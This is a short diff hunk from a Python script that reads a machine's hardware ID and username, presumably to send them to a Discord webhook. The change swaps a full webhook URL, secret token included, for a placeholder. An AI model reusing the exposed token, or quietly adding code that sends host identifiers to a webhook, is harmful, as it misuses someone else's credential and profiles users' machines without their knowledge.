@@ -25,7 +25,7 @@ hwid = str(uuid.getnode())
 username = getpass.getuser()
 
 # Set the webhook URL
-webhook_url = 'https://discord.com/api/webhooks/1050012865945403412/HO6zqwSVWH0Y0w5Y5yCgRettdBfAVI8R6pq5VI_9FPbu4F_eMyoowyyyph436iOjWB28'
+webhook_url = 'discord webhook here'
 
 # Set the request data
 data = {
